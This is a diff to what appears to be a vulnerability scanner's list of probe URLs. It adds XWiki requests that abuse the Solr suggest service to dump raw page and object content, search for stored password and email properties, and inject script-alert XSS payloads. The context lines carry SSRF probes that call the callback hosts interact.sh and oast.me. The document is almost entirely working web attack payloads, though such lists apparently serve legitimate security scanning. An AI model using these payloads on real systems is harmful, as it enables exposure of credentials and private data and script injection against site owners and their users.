@@ -247,3 +247,13 @@
 /system/modules/alkacon.mercury.template.jsondemo/elements/jsonapi.jsp?content&fallbackLocale&locale=en&rows=1&uri=http://interact.sh
 /wp-content/plugins/wordpress-toolbar/toolbar.php?wptbto=https://oast.me&wptbhash=acme
 /wp-admin/admin.php?page=wc-settings&action=redirect_telcell_form&api_url=https://oast.me
+/bin/get/XWiki/SuggestSolrService?outputSyntax=plain&media=json&nb=1000&query=q%3D*%3A*%0Aq.op%3DAND%0Afq%3Dtype%3ADOCUMENT%0Afl%3Dtitle_%2C+reference%2C+links%2C+doccontentraw_%2C+objcontent__&input=+
+/xwiki/bin/get/XWiki/SuggestSolrService?outputSyntax=plain&media=json&nb=1000&query=q%3D*%3A*%0Aq.op%3DAND%0Afq%3Dtype%3ADOCUMENT%0Afl%3Dtitle_%2C+reference%2C+links%2C+doccontentraw_%2C+objcontent__&input=+
+/bin/view/Main/Search?r=1&text=propertyvalue%3A%3F*%20AND%20reference%3A*.password&f_locale=en&f_locale=
+/xwiki/bin/view/Main/Search?r=1&text=propertyvalue%3A%3F*%20AND%20reference%3A*.password&f_locale=en&f_locale=
+/bin/create/Main/%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/xwiki/bin/create/Main/%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/bin/view/Main/?rev=xar%3Aorg.xwiki.platform%3Axwiki-platform-distribution-flavor-common%2F15.5%25%25%22%3e%3cscript%3ealert(document.domain)%3c%2fscript%3e
+/xwiki/bin/view/Main/?rev=xar%3Aorg.xwiki.platform%3Axwiki-platform-distribution-flavor-common%2F15.5%25%25%22%3e%3cscript%3ealert(document.domain)%3c%2fscript%3e
+/bin/view/Main/Search?sort=score&sortOrder=desc&highlight=true&facet=true&r=1&f_locale=en&f_locale=&text=objcontent%3Aemail*
+/xwiki/bin/view/Main/Search?sort=score&sortOrder=desc&highlight=true&facet=true&r=1&f_locale=en&f_locale=&text=objcontent%3Aemail*
